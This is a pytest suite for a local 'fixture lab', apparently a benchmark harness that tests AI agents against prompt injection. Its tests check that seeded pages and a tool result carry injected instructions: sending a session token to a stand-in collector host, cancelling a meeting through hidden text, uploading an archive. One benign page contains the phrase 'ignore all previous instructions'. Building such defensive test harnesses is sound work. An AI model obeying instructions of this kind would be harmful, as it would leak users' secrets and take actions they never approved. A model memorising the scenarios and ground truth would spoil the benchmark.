"""The fixture lab: virtual hosts, admin protection, ledger, deterministic reset, purity."""

from __future__ import annotations

import ast
import json
import re
from collections.abc import Iterator
from pathlib import Path

import httpx
import pytest
from fastapi.testclient import TestClient

from apps.fixture_lab.app import create_app
from apps.fixture_lab.server import LabServer
from apps.fixture_lab.state import FIXTURES_ROOT, LabState
from sentinelx.common_schemas import ScenarioSpec

SCENARIOS = ["S1", "S1_TOOL", "S2", "S2_HIDDEN", "S3", "B1", "B2", "B3"]


@pytest.fixture(scope="module")
def lab(tmp_path_factory: pytest.TempPathFactory) -> Iterator[LabServer]:
    server = LabServer(tmp_path_factory.mktemp("ledger"), admin_token="test-admin-token").start()
    yield server
    server.stop()


@pytest.fixture()
def client(lab: LabServer) -> httpx.Client:
    with httpx.Client(base_url=f"http://127.0.0.1:{lab.port}", timeout=5) as c:
        yield c


def host(lab: LabServer, name: str) -> dict[str, str]:
    return {"Host": f"{name}.lab.test:{lab.port}"}


def test_binds_loopback_on_an_os_chosen_port(lab: LabServer) -> None:
    assert lab.port > 1024 and lab.port != 0
    bound = lab._server.servers[0].sockets[0].getsockname()  # noqa: SLF001
    assert bound[0] == "127.0.0.1"


@pytest.mark.parametrize(
    ("vhost", "path", "needle"),
    [
        ("orders", "/", "Orders Lab"),
        ("orders", "/orders/1042", "Status:"),
        ("orders", "/invoices/INV-77", "Total: $129.00"),
        ("calendar", "/", "Calendar Lab"),
        ("calendar", "/today", "Team standup"),
        ("support", "/", "kb-search"),
        ("support", "/search?q=password+reset", "How to reset your password"),
        ("support", "/docs", "doc-search"),
        ("collector", "/", "synthetic collector"),
    ],
)
def test_each_virtual_host_serves_its_pages(lab, client, vhost, path, needle) -> None:
    lab.reset("B1")
    r = client.get(path, headers=host(lab, vhost))
    assert r.status_code == 200 and needle in r.text


@pytest.mark.parametrize(
    "bad_host",
    ["evil.example", "127.0.0.1", "localhost", "orders.lab.test.evil.example", "lab.test",
     "xorders.lab.test", "", "orders.lab.test."],
)
def test_unknown_host_gets_404(lab, client, bad_host) -> None:
    r = client.get("/orders/1042", headers={"Host": bad_host})
    assert r.status_code == 404


def test_other_vhosts_do_not_leak_routes(lab, client) -> None:
    assert client.get("/orders/1042", headers=host(lab, "calendar")).status_code == 404
    assert client.get("/today", headers=host(lab, "orders")).status_code == 404
    assert client.get("/_orders/orders/1042", headers=host(lab, "orders")).status_code == 404


# ---------------------------------------------------------------- admin protection
def test_admin_requires_token(lab, client) -> None:
    for path in ("/__admin__/ledger",):
        assert client.get(path).status_code == 403
        assert client.get(path, headers={"X-Admin-Token": "wrong"}).status_code == 403
        assert client.get(path, headers=host(lab, "orders")).status_code == 403
    r = client.post("/__admin__/reset", json={"scenario_id": "S1"})
    assert r.status_code == 403
    ok = client.get("/__admin__/ledger", headers={"X-Admin-Token": "test-admin-token"})
    assert ok.status_code == 200 and "entries" in ok.json()


def test_admin_rejects_non_loopback_clients(tmp_path: Path) -> None:
    state = LabState(tmp_path, "tok")
    app = create_app(state)
    headers = {"X-Admin-Token": "tok"}
    with TestClient(app, client=("10.0.0.5", 4444)) as remote:
        assert remote.get("/__admin__/ledger", headers=headers).status_code == 403
    with TestClient(app, client=("127.0.0.1", 4444)) as local:
        assert local.get("/__admin__/ledger", headers=headers).status_code == 200


def test_admin_reset_endpoint(lab, client) -> None:
    r = client.post("/__admin__/reset", json={"scenario_id": "S2"},
                    headers={"X-Admin-Token": "test-admin-token"})
    assert r.status_code == 200 and r.json()["scenario_id"] == "S2"
    bad = client.post("/__admin__/reset", json={"scenario_id": "../etc"},
                      headers={"X-Admin-Token": "test-admin-token"})
    assert bad.status_code == 404


# ---------------------------------------------------------------- deterministic reset
def test_reset_gives_identical_fixture_hash_for_same_seed(lab) -> None:
    a = lab.reset("S1", 77)
    lab.state.data["orders"]["1042"]["status"] = "tampered"
    b = lab.reset("S1", 77)
    assert a == b and len(a) == 64
    assert lab.reset("S1", 78) != a


def test_reset_restores_state_token_and_ledger(lab, client) -> None:
    lab.reset("S2", 5)
    token = lab.state.data["token"]
    client.post("/api/cancel", headers=host(lab, "calendar"), content=b"x")
    today = client.get("/today", headers=host(lab, "calendar")).text
    assert lab.read_ledger() and "(cancelled)" in today
    lab.reset("S2", 5)
    assert lab.read_ledger() == [] and lab.state.data["token"] == token
    assert "(cancelled)" not in client.get("/today", headers=host(lab, "calendar")).text


def test_synthetic_token_comes_from_the_seed(lab) -> None:
    lab.reset("S1", 1)
    t1 = lab.state.data["token"]
    lab.reset("S1", 2)
    assert t1 != lab.state.data["token"]
    assert re.fullmatch(r"synth_tok_[0-9a-f]{16}", t1)


# ---------------------------------------------------------------- ledger
def test_ledger_records_mock_endpoint_calls_and_nothing_else(lab, client) -> None:
    lab.reset("S1", 9)
    token = lab.state.data["token"]
    for name, path in [("orders", "/"), ("orders", "/orders/1042"), ("calendar", "/today"),
                       ("support", "/search?q=password"), ("collector", "/"),
                       ("collector", "/nothing-here")]:
        client.get(path, headers=host(lab, name))
    assert lab.read_ledger() == []
    client.post("/collect", headers=host(lab, "collector"), content=f"tok={token}".encode())
    client.post("/api/cancel", headers=host(lab, "calendar"), content=b"{}")
    client.post("/api/upload", headers=host(lab, "support"), content=b"archive")
    client.get("/api/upload", headers=host(lab, "support"))  # 405: not a call to the endpoint
    entries = lab.read_ledger()
    assert [(e["host"], e["path"], e["method"]) for e in entries] == [
        ("collector.lab.test", "/collect", "POST"),
        ("calendar.lab.test", "/api/cancel", "POST"),
        ("support.lab.test", "/api/upload", "POST"),
    ]
    first = entries[0]
    assert first["body"] == f"tok={token}" and first["secret_token_seen"] is True
    assert first["ts"].endswith("Z") and "host" in first["headers"]
    assert entries[1]["secret_token_seen"] is False


def test_ledger_is_exposed_only_through_the_token_protected_admin_endpoint(lab, client) -> None:
    lab.reset("S1")
    client.post("/collect", headers=host(lab, "collector"), content=b"x")
    assert client.get("/__admin__/ledger", headers=host(lab, "collector")).status_code == 403
    r = client.get("/__admin__/ledger", headers={"X-Admin-Token": "test-admin-token"})
    assert len(r.json()["entries"]) == 1


# ---------------------------------------------------------------- scenario content
@pytest.mark.parametrize("sid", SCENARIOS)
def test_scenario_specs_and_ground_truth_are_valid(sid: str) -> None:
    raw = (FIXTURES_ROOT / "scenarios" / f"{sid}.json").read_text("utf-8")
    spec = ScenarioSpec.model_validate_json(raw)
    gt = json.loads((FIXTURES_ROOT / "ground_truth" / f"{sid}.json").read_text("utf-8"))
    assert spec.id == gt["scenario_id"] == sid
    assert all(h.endswith(".lab.test") for h in spec.allowed_hosts)
    assert gt["is_attack"] == (not sid.startswith("B"))
    assert (FIXTURES_ROOT / "payloads").glob(f"{spec.attack_payload_id}.*")


def test_attack_payloads_appear_where_they_should(lab, client) -> None:
    lab.reset("S1")
    assert "send the session token" in client.get("/orders/1042", headers=host(lab, "orders")).text
    lab.reset("S2")
    assert "/api/cancel" in client.get("/today", headers=host(lab, "calendar")).text
    lab.reset("S2_HIDDEN")
    body = client.get("/today", headers=host(lab, "calendar")).text
    assert 'style="display:none"' in body and "/api/cancel" in body
    lab.reset("S3")
    hits = client.get("/search?q=password+reset", headers=host(lab, "support")).text
    assert "/api/upload" in hits
    lab.reset("S1_TOOL")
    clean = client.get("/orders/1042", headers=host(lab, "orders")).text
    assert "send the session token" not in clean
    notes = client.get("/__tools__/lookup_order?order_id=1042", headers=host(lab, "orders")).json()
    assert "send the session token" in notes["notes"] and notes["status"] == "shipped"
    assert f"collector.lab.test:{lab.port}/collect" in notes["notes"]


def test_benign_pages_are_benign(lab, client) -> None:
    lab.reset("B1")
    page = client.get("/search?q=1042", headers=host(lab, "orders")).text
    assert "Status: shipped" in page and "never ask you for your password" in page
    lab.reset("B2")
    inv = client.get("/invoices/INV-77", headers=host(lab, "orders")).text
    assert 'id="close-popup"' in inv and "close the marketing popup" in inv
    lab.reset("B3")
    doc = client.get("/docs?q=prompt", headers=host(lab, "support")).text
    assert "ignore all previous instructions" in doc and "/api/" not in doc


# ---------------------------------------------------------------- purity
def test_no_external_assets_in_fixture_files() -> None:
    for sub in ("pages", "payloads"):
        for path in (FIXTURES_ROOT / sub).glob("*"):
            text = path.read_text(encoding="utf-8")
            for url in re.findall(r"https?://[^\s\"'<>]+", text):
                ok = re.match(r"https?://(?:\w+)\.lab\.test|https?://\{\{", url)
                assert ok, (path.name, url)
            external = re.search(r"<(?:script|link|img|iframe)\b[^>]*\b(?:src|href)=", text)
            assert not external, path.name


def test_lab_package_makes_no_outbound_requests() -> None:
    banned = {"httpx", "requests", "aiohttp", "socket", "urllib.request", "urllib3", "http.client"}
    for path in (Path(__file__).resolve().parents[2] / "apps" / "fixture_lab").glob("*.py"):
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
            names = []
            if isinstance(node, ast.Import):
                names = [a.name for a in node.names]
            elif isinstance(node, ast.ImportFrom) and node.module:
                names = [node.module]
            assert not set(names) & banned, (path.name, names)
